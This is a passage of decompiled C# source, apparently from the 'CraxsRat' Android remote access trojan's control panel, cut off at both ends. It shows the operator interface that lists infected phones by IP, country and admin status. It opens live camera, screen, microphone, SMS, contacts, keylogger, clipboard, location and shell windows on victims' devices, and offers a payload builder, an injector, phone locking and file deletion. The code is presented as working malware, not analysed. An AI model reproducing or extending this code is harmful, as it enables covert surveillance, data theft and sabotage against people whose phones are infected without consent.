			toolStripMenuItem9.DropDownItems[1].Text = "قفل الهاتف";
			toolStripMenuItem9.DropDownItems[2].Text = "حذف ملفات الهاتف";
			ctxmenu.Items[6].Text = "أدواة";
			ToolStripMenuItem toolStripMenuItem10 = (ToolStripMenuItem)ctxmenu.Items[6];
			toolStripMenuItem10.DropDownItems[0].Text = "إجراء إتصال";
			toolStripMenuItem10.DropDownItems[1].Text = "تثبيت تطبيق";
			toolStripMenuItem10.DropDownItems[2].Text = "إرسال تنبيه";
			toolStripMenuItem10.DropDownItems[3].Text = "الحافظة";
			toolStripMenuItem10.DropDownItems[4].Text = "فتح موقع";
			toolStripMenuItem10.DropDownItems[5].Text = "موجه الأوامر";
			ctxmenu.Items[8].Text = "المزيد";
			ToolStripMenuItem toolStripMenuItem11 = (ToolStripMenuItem)ctxmenu.Items[8];
			toolStripMenuItem11.DropDownItems[0].Text = "إشعارات الهاتف";
			toolStripMenuItem11.DropDownItems[1].Text = "المكالمات الحالية";
			toolStripMenuItem11.DropDownItems[2].Text = "معلومات الهاتف";
			ctxmenu.Items[10].Text = "الإتصال";
			ToolStripMenuItem toolStripMenuItem12 = (ToolStripMenuItem)ctxmenu.Items[10];
			toolStripMenuItem12.DropDownItems[0].Text = "إعادة الأتصال";
			toolStripMenuItem12.DropDownItems[1].Text = "حظر المستخدم";
			toolStripMenuItem12.DropDownItems[2].Text = "إيقاف منع الحذف";
			toolStripMenuItem12.DropDownItems[3].Text = "حذف التطبيق";
			ctxmenu.Items[12].Text = "لوحة المفاتيح (beta)";
			ctxmenu.Items[14].Text = "ملفات المستخدم";
			TRKctx.Items[0].Text = "إضافة تطبيق";
			TRKctx.Items[1].Text = "لقطات الشاشة";
			TRKctx.Items[2].Text = "السجلات";
			TRKctx.Items[3].Text = "حذف  لقطات الشاشة";
			TRKctx.Items[4].Text = "حذف السجلات";
			TRKctx.Items[5].Text = "إيقاف التتبع";
			FWctx.Items[0].Text = "السماح";
			FWctx.Items[1].Text = "حظر";
			FWctx.Items[2].Text = "اضافة للتعقب";
		}
	}

	public void Newinstance()
	{
		InitializeComponent();
		RegistryHandler.iniliz();
		if (Conversions.ToBoolean(Operators.NotObject(Codes.inializeReg())))
		{
			Interaction.MsgBox("Error Reg Config");
			Environment.Exit(0);
		}
		if (RegistryHandler.Get_Language() == null)
		{
			LanguageSelector languageSelector = new LanguageSelector();
			languageSelector.ShowDialog();
			switch (languageSelector.SelectedLang)
			{
			default:
				RegistryHandler.Set_Language("EN");
				break;
			case "CN":
				RegistryHandler.Set_Language("CN");
				break;
			case "EN":
				RegistryHandler.Set_Language("EN");
				break;
			case "AR":
				RegistryHandler.Set_Language("AR");
				break;
			}
		}
		Translateme();
		SCANER = new clsComputerInfo();
		Data.MainForm = this;
	}

	public CraxsRatMain()
	{
		base.Load += CraxsRatMain_Load;
		base.Closing += AngelAndroidForm_Closing;
		base.FormClosing += AngelAndroidForm_FormClosing;
		base.Deactivate += CypherRat_Deactivate;
		base.Activated += CypherRat_Activated;
		PORTs = "";
		server = new List<Accept>();
		Myname = "Cobra Rat";
		xt_err = 0;
		Alive = true;
		DKF = "";
		DKD = "BRTHRRTBSA";
		GlobalMap = new GeoMap();
		Globalvlues = null;
		NumWorkers = 0;
		SCANER = null;
		isactive = true;
		searchbefore = new List<DataGridViewRow>();
		Newinstance();
	}

	private void NotifyI()
	{
		notfi.Visible = true;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void Countryclickhandelr(object arg1, MapData arg2)
	{
		Point position = Cursor.Position;
		checked
		{
			position.Y += (int)Math.Round((double)Cursor.Size.Height * 1.5);
			ToolTips.Show(arg2.Name, this, PointToClient(position), 3000);
		}
	}

	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(VB_0024StateMachine_29_CraxsRatMain_Load))]
	private void CraxsRatMain_Load(object sender, EventArgs e)
	{
		VB_0024StateMachine_29_CraxsRatMain_Load stateMachine = new VB_0024StateMachine_29_CraxsRatMain_Load();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_sender = sender;
		stateMachine._0024VB_0024Local_e = e;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void SizeDGV(DataGridView dgv)
	{
		dgv.ScrollBars = ScrollBars.None;
		checked
		{
			int num = dgv.Rows.GetRowsHeight(DataGridViewElementStates.None) + dgv.ColumnHeadersHeight;
			num += dgv.Rows.Count * 4;
			int num2 = dgv.Columns.GetColumnsWidth(DataGridViewElementStates.None) + dgv.RowHeadersWidth;
			dgv.ClientSize = new Size(num2, num);
		}
	}

	public string GetExceptionInfo(Exception ex)
	{
		int hRForException = Marshal.GetHRForException(ex);
		string text = ex.GetType().ToString() + "(0x" + hRForException.ToString("X8") + "): " + ex.Message + Environment.NewLine + ex.StackTrace + Environment.NewLine;
		StackTrace stackTrace = new StackTrace(ex, fNeedFileInfo: true);
		StackFrame[] frames = stackTrace.GetFrames();
		foreach (StackFrame stackFrame in frames)
		{
			if (stackFrame.GetFileLineNumber() > 0)
			{
				text = text + "Line:" + Conversions.ToString(stackFrame.GetFileLineNumber()) + " Filename: " + Path.GetFileName(stackFrame.GetFileName()) + Environment.NewLine;
			}
		}
		return text;
	}

	private void AngelAndroidForm_Closing(object sender, CancelEventArgs e)
	{
		FormEventArgsClosing();
	}

	public void FormEventArgsClosing()
	{
		try
		{
			notfi.Visible = false;
			Statustimer.Stop();
			monitortimer.Stop();
			if (checksavepass.Checked)
			{
				MySettingsProperty.Settings.savepass = true;
				MySettingsProperty.Settings.Save();
			}
			else
			{
				MySettingsProperty.Settings.savepass = false;
				MySettingsProperty.Settings.Save();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				Alive = false;
				Thread.Sleep(5);
				if (server != null)
				{
					int num = server.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							server[i].MainListner.Stop();
							server[i].MainListner.Server.Close();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				PORTs = "";
				foreach (DataGridViewRow item in (IEnumerable)DGVSERVS.Rows)
				{
					ref string pORTs = ref PORTs;
					pORTs = pORTs + item.Cells[1].Value.ToString() + ">";
				}
				MySettingsProperty.Settings.ports = PORTs;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			Application.ExitThread();
			Environment.Exit(0);
		}
	}

	private void notfi_MouseClick(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			if (base.WindowState != FormWindowState.Normal)
			{
				base.WindowState = FormWindowState.Normal;
			}
			base.TopMost = true;
			base.TopMost = false;
		}
	}

	private void BuildToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (B == null)
		{
			B = new Build();
			DialogResult dialogResult = B.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				B.Close();
				B = null;
			}
			else
			{
				B.Close();
				B = null;
			}
		}
	}

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		FormEventArgsClosing();
	}

	public void StartWorkercheck()
	{
		NumWorkers = Operators.AddObject(NumWorkers, 1);
		Workers = new BackgroundWorker[checked(Conversions.ToInteger(NumWorkers) + 1)];
		Workers[Conversions.ToInteger(NumWorkers)] = new BackgroundWorker();
		Workers[Conversions.ToInteger(NumWorkers)].WorkerReportsProgress = true;
		Workers[Conversions.ToInteger(NumWorkers)].WorkerSupportsCancellation = true;
		Workers[Conversions.ToInteger(NumWorkers)].DoWork += myworker;
		Workers[Conversions.ToInteger(NumWorkers)].RunWorkerAsync();
	}

	private void myworker(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		PortsManager.Done(new object[1] { "Security Check" });
		PortsManager.opebbtn(new object[1] { "" });
	}

	public void addLog(object[] objs)
	{
		if (DataLog.InvokeRequired)
		{
			addLogback method = addLog;
			DataLog.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		string text2 = Conversions.ToString(objs[2]);
		string text3 = Conversions.ToString(objs[3]);
		DataLog.Rows.Add(image, text, text2, text3, DateAndTime.Now.ToShortTimeString().ToString());
		if (checkclearlogs.Checked && DataLog.Rows.Count > 20)
		{
			DataLog.Rows.Clear();
		}
	}

	public void LogNotifi(object[] objs)
	{
		if (DGVNOTF.InvokeRequired)
		{
			deleNotifidgv method = LogNotifi;
			DGVNOTF.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVNOTF.Rows.Count >= 100)
		{
			DGVNOTF.Rows.Remove(DGVNOTF.Rows[0]);
		}
		DGVNOTF.Rows.Add(image, text);
	}

	public void LogCalls(object[] objs)
	{
		if (DGVCALLS.InvokeRequired)
		{
			delecallsidgv method = LogCalls;
			DGVCALLS.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVCALLS.Rows.Count >= 100)
		{
			DGVCALLS.Rows.Remove(DGVCALLS.Rows[0]);
		}
		DGVCALLS.Rows.Add(image, text);
	}

	public void Logalert(object[] objs)
	{
		if (DGVALRTS.InvokeRequired)
		{
			delealertsidgv method = Logalert;
			DGVALRTS.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVALRTS.Rows.Count >= 100)
		{
			DGVALRTS.Rows.Remove(DGVALRTS.Rows[0]);
		}
		DGVALRTS.Rows.Add(image, text);
	}

	public void UpdateForms(Client TargetClient)
	{
		foreach (Form openForm in Application.OpenForms)
		{
			try
			{
				if (openForm != null && openForm.Tag != null)
				{
					CameraManager cameraManager = new CameraManager();
					if (Operators.CompareString(openForm.Tag.ToString(), "Cam_" + TargetClient.UUID, TextCompare: false) == 0)
					{
						cameraManager = (CameraManager)openForm;
						cameraManager.Name = "Camera_Manager_" + TargetClient.ClientRemoteAddress;
						cameraManager.Tag = "Cam_" + TargetClient.UUID;
						if (Operators.CompareString(cameraManager.CamerID, "null", TextCompare: false) != 0)
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Client = TargetClient.myClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Selected(cameraManager.CamerID);
							cameraManager.statustext.Text = "Reconnecting....";
							cameraManager.CAM0.Image = Resources.loading_please_wait;
						}
						else
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Text = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							if (cameraManager.classClient != null)
							{
								reso.Directory_Exist(cameraManager.classClient);
								cameraManager.tmpFolderUSER = TargetClient.FolderUSER;
							}
							cameraManager.Client = cameraManager.classClient.myClient;
							cameraManager.classCamera = TargetClient;
							cameraManager.TempImage = new PictureBox();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (openForm != null && openForm.Tag != null && Operators.CompareString(openForm.Tag.ToString(), "screen_" + TargetClient.UUID, TextCompare: false) == 0)
				{
					ScreenShoter screenShoter = (ScreenShoter)openForm;
					if (screenShoter != null)
					{
						if (screenShoter.LIVE)
						{
							string[] array = TargetClient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								TargetClient.myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:on:" + screenShoter.Qualtibox.Text + "~" + screenShoter.FPSBOX.Text + "~" + TargetClient.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + TargetClient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								TargetClient
							};
							TargetClient.SendMessage(parametersObjects);
							screenShoter.toptitle.Text = "Reconnecting , Please Wait...";
							screenShoter.Livepicbox.Image = Resources.loading_please_wait;
							screenShoter.StartButton.Enabled = false;
							screenShoter.StopButton.Enabled = true;
							screenShoter.vewpnl.Enabled = true;
							screenShoter.Livepicbox.Enabled = true;
							screenShoter.LIVE = true;
							screenShoter.refreshtimer.Enabled = true;
							screenShoter.refreshtimer.Start();
						}
						else
						{
							string name = "Live_Screen_" + TargetClient.ClientRemoteAddress;
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", TargetClient.ClientAddressIP);
							screenShoter.Tag = TargetClient.ClientAddressIP;
							screenShoter.classClient = TargetClient;
							screenShoter.Client = TargetClient.myClient;
							screenShoter.toptitle.Text = "Client Ready...";
							screenShoter.DownloadsFolder = TargetClient.FolderUSER;
							screenShoter.Livepicbox.Image = null;
							screenShoter.Tag = "screen_" + TargetClient.UUID;
						}
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (openForm != null && openForm.Tag != null && Operators.CompareString(openForm.Tag.ToString(), "File" + TargetClient.UUID, TextCompare: false) == 0)
				{
					FileManager fileManager = (FileManager)openForm;
					fileManager.Tag = "File" + TargetClient.UUID;
					fileManager.Name = "File_Manager_File" + TargetClient.UUID;
					fileManager.Title = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Text = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Client = TargetClient.myClient;
					fileManager.classClient = TargetClient;
					fileManager.ver = TargetClient.VersionClient;
					fileManager.DGV0.AutoGenerateColumns = false;
					fileManager.DGV0.Columns[5].DisplayIndex = 0;
					fileManager.viwimage.Image = null;
					break;
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Addnewrow(object[] objs)
	{
		if (ClientsWindow.InvokeRequired)
		{
			deleaddnewrow method = Addnewrow;
			ClientsWindow.Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			Client client = (Client)objs[0];
			lock (Data._clientRowIndices)
			{
				if (Data._clientRowIndices.ContainsKey(client.UUID))
				{
					try
					{
						Client client2 = Data._clientRowIndices[client.UUID];
						int index = Data._clientRowIndices[client.UUID].Row.Index;
						string[] array = client.Keys.Split(':');
						ClientsWindow.Rows[index].Cells[0].Value = reso.GetScreen(client.Screen);
						ClientsWindow.Rows[index].Cells[1].Value = client.Wallpaper;
						ClientsWindow.Rows[index].Cells[2].Value = client.Flag;
						ClientsWindow.Rows[index].Cells[3].Value = client.ClientName;
						ClientsWindow.Rows[index].Cells[4].Value = client.Country;
						ClientsWindow.Rows[index].Cells[5].Value = client.ClientAddressIP + ":" + array[1];
						ClientsWindow.Rows[index].Cells[6].Value = client.android;
						ClientsWindow.Rows[index].Cells[7].Value = client.Phone_model;
						ClientsWindow.Rows[index].Cells[8].Value = Codes.BlankImage();
						ClientsWindow.Rows[index].Cells[9].Value = Codes.BlankImage();
						ClientsWindow.Rows[index].Cells[10].Value = reso.GetBattery(client.Battery);
						ClientsWindow.Rows[index].Cells[11].Value = client.Wifi;
						ClientsWindow.Rows[index].Cells[12].Value = "";
						ClientsWindow.Rows[index].Cells[13].Value = client.ClientDefender;
						ClientsWindow.Rows[index].Cells[14].Value = reso.CheckAdmin(client.IsAdminActive);
						ClientsWindow.Rows[index].Cells[15].Value = client.Statistics;
						ClientsWindow.Rows[index].Tag = client.UUID;
						ClientsWindow.Rows[index].Cells[8].Tag = client;
						ClientsWindow.Rows[index].Cells[6].Tag = client.UUID;
						ClientsWindow.Rows[index].Cells[2].Tag = client.UUID;
						client.Row = client2.Row;
						client2 = client;
						client.Statistics = "Reset";
						ClientsWindow.Rows[index].Cells[15].Style.ForeColor = System.Drawing.Color.Lime;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("Error 123:");
						Console.ResetColor();
						ProjectData.ClearProjectError();
					}
					Data._clientRowIndices[client.UUID] = client;
				}
				else
				{
					string[] array2 = client.Keys.Split(':');
					int index2 = ClientsWindow.Rows.Add(reso.GetScreen(client.Screen), client.Wallpaper, client.Flag, client.ClientName, client.Country, client.ClientAddressIP + ":" + array2[1], client.android, client.Phone_model, Codes.BlankImage(), Codes.BlankImage(), reso.GetBattery(client.Battery), client.Wifi, "", client.ClientDefender, reso.CheckAdmin(client.IsAdminActive), "New", client.installdate);
					client.Row = ClientsWindow.Rows[index2];
					ClientsWindow.Rows[index2].Tag = client.UUID;
					ClientsWindow.Rows[index2].Cells[8].Tag = client;
					ClientsWindow.Rows[index2].Cells[6].Tag = client.UUID;
					ClientsWindow.Rows[index2].Cells[2].Tag = client.UUID;
					Data._clientRowIndices[client.UUID] = client;
					ClientsWindow.Rows[index2].Cells[15].Style.ForeColor = System.Drawing.Color.Lime;
					string toolTipText = "Client-Info\r\nName:" + client.ClientName + "\r\nDefender:" + client.ClientDefender + "\r\nFrom:" + client.Country + "\r\nHost:" + array2[6] + "\r\nip:" + array2[0] + "\r\nAndorid:" + client.android + "\r\nPort:" + array2[1] + "\r\n";
					ClientsWindow.Rows[index2].Cells[0].ToolTipText = toolTipText;
					if (Operators.CompareString(SpySettings.SOHW_ALERT, "Yes", TextCompare: false) == 0)
					{
						string msg = "Name: " + client.ClientName + "\r\nCountry: " + client.Country;
						CraxsAlert.ShowCustome(msg, client.Wallpaper, System.Drawing.Color.Black, System.Drawing.Color.Lime);
					}
				}
			}
			UpdateForms(client);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void RemoveCard(DataGridViewRow row, string uuid)
	{
		_Closure_0024__57_002D0 arg = default(_Closure_0024__57_002D0);
		_Closure_0024__57_002D0 CS_0024_003C_003E8__locals12 = new _Closure_0024__57_002D0(arg);
		CS_0024_003C_003E8__locals12._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals12._0024VB_0024Local_row = row;
		CS_0024_003C_003E8__locals12._0024VB_0024Local_uuid = uuid;
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals12._0024VB_0024Me.RemoveCard(CS_0024_003C_003E8__locals12._0024VB_0024Local_row, CS_0024_003C_003E8__locals12._0024VB_0024Local_uuid);
			}));
			return;
		}
		try
		{
			string text = "null";
			try
			{
				if (CS_0024_003C_003E8__locals12._0024VB_0024Local_row != null)
				{
					text = Conversions.ToString(CS_0024_003C_003E8__locals12._0024VB_0024Local_row.Cells[6].Tag);
					ClientsWindow.Rows.Remove(CS_0024_003C_003E8__locals12._0024VB_0024Local_row);
					lock (Data._clientRowIndices)
					{
						if (Data._clientRowIndices.ContainsKey(CS_0024_003C_003E8__locals12._0024VB_0024Local_uuid))
						{
							Data._clientRowIndices.Remove(CS_0024_003C_003E8__locals12._0024VB_0024Local_uuid);
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, "null", TextCompare: false) == 0 || Operators.CompareString(text, "null", TextCompare: false) == 0)
			{
				return;
			}
			string name = "Calls_Manager_" + text;
			Form form = MyProject.Application.OpenForms[name];
			string[] array = new string[2] { "Close windows", "Disconnected ---> " };
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text2 = form.Text;
					form.Text = array[1] + text2;
				}
			}
			name = "Live_Screen_" + text;
			ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
			if (screenShoter != null)
			{
				screenShoter.Done(new object[1] { "Connection lost..." });
				screenShoter.Livepicbox.Image = Resources.disconnected;
			}
			name = "SMS_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text3 = form.Text;
					form.Text = array[1] + text3;
				}
			}
			name = "Contacts_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text4 = form.Text;
					form.Text = array[1] + text4;
				}
			}
			name = "Camera_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text5 = form.Text;
					form.Text = array[1] + text5;
					((CameraManager)form).CAM0.Image = Resources.disconnected;
				}
			}
			try
			{
				name = "File_Manager_File" + CS_0024_003C_003E8__locals12._0024VB_0024Local_uuid;
				form = MyProject.Application.OpenForms[name];
				if (form != null && !form.IsDisposed)
				{
					FileManager fileManager = (FileManager)form;
					string text6 = form.Text;
					form.Text = array[1] + text6;
					foreach (DataGridViewRow item in (IEnumerable)fileManager.DGVDATA.Rows)
					{
						try
						{
							if (Operators.ConditionalCompareObjectEqual(item.Cells[4].Value, "Downloading..", TextCompare: false))
							{
								item.Cells[4].Value = "Wating..";
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox("error x1" + ex2.Message);
				ProjectData.ClearProjectError();
			}
			name = "Microphone_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text7 = form.Text;
					form.Text = array[1] + text7;
				}
			}
			name = "SM_Hunter_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				string text8 = form.Text;
				form.Text = array[1] + text8;
			}
			name = "Shell_Terminal_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text9 = form.Text;
					form.Text = array[1] + text9;
				}
			}
			name = "Location_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text10 = form.Text;
					form.Text = array[1] + text10;
				}
			}
			name = "Applications_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text11 = form.Text;
					form.Text = array[1] + text11;
				}
			}
			name = "Account_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text12 = form.Text;
					form.Text = array[1] + text12;
				}
			}
			name = "informations_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text13 = form.Text;
					form.Text = array[1] + text13;
				}
			}
			name = "Keylogger_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
				}
				else
				{
					string text14 = form.Text;
					form.Text = array[1] + text14;
				}
			}
			name = "Clipboard_Manager_" + text;
			form = MyProject.Application.OpenForms[name];
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
				{
					form.Close();
					return;
				}
				string text15 = form.Text;
				form.Text = array[1] + text15;
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void UsersToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (WU != null)
		{
			return;
		}
		WU = new Win_Users();
		string path = reso.res_Path + "\\Users";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			string[] array = directories;
			foreach (string path2 in array)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path2);
				string path3 = directoryInfo.FullName + "\\user.info";
				if (!File.Exists(path3))
				{
					continue;
				}
				try
				{
					string[] array2 = File.ReadAllLines(path3);
					if (array2.Length == 3)
					{
						string text = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
						WU.DGV0.Rows.Add(array2[0], array2[2] + " /ip:" + array2[1], directoryInfo.Name, reso.GetEllImage(0, new object[5] { text, 15, 15, 17, 17 }));
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		WU.DGV0.Columns[3].Width = 48;
		WU.DGV0.Columns[3].DisplayIndex = 0;
		WU.StartPosition = FormStartPosition.Manual;
		WU.Location = Codes.FixSize(this, WU);
		WU.Show();
	}

	private void AngelAndroidForm_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (CYPHERSETTNGS == null)
		{
			CYPHERSETTNGS = new CraxsSettings();
			DialogResult dialogResult = CYPHERSETTNGS.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				CYPHERSETTNGS.Close();
				CYPHERSETTNGS = null;
			}
			else
			{
				CYPHERSETTNGS.Close();
				CYPHERSETTNGS = null;
			}
		}
	}

	private void Label2_MouseDown(object sender, MouseEventArgs e)
	{
		mov = true;
		Min = Control.MousePosition.Y;
		Mx = Control.MousePosition.X;
		Sw = base.Width;
		Sh = base.Height;
	}

	private void Label2_MouseMove(object sender, MouseEventArgs e)
	{
		if (mov)
		{
			base.Height = checked(Control.MousePosition.Y - Min + Sh);
		}
	}

	private void Label2_MouseUp(object sender, MouseEventArgs e)
	{
		mov = false;
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (B == null)
		{
			B = new Build();
			DialogResult dialogResult = B.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				B.Close();
				B = null;
			}
			else
			{
				B.Close();
				B = null;
			}
		}
	}

	private void DrakeUIAvatar3_Click(object sender, EventArgs e)
	{
		if (DataLog.Rows.Count > 0)
		{
			DataLog.Rows.Clear();
		}
	}

	private void DrakeUIAvatar4_Click(object sender, EventArgs e)
	{
		if (CYPHERSETTNGS == null)
		{
			CYPHERSETTNGS = new CraxsSettings();
			DialogResult dialogResult = CYPHERSETTNGS.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				CYPHERSETTNGS.Close();
				CYPHERSETTNGS = null;
			}
			else
			{
				CYPHERSETTNGS.Close();
				CYPHERSETTNGS = null;
			}
		}
	}

	private void DrakeUIAvatar8_Click(object sender, EventArgs e)
	{
		infotitlepanel.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				bigtitletext.Text = "Dashboard";
			}
			else
			{
				bigtitletext.Text = "主面板";
			}
		}
		else
		{
			bigtitletext.Text = "لوحة رئيسية";
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIAvatar9_Click(object sender, EventArgs e)
	{
		if (JC == null)
		{
			JC = new Jector();
			DialogResult dialogResult = JC.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				JC.Close();
				JC = null;
			}
			else
			{
				JC.Close();
				JC = null;
			}
		}
	}

	private void CypherRat_Deactivate(object sender, EventArgs e)
	{
		try
		{
			isactive = false;
			base.ActiveControl = ClientsWindow;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
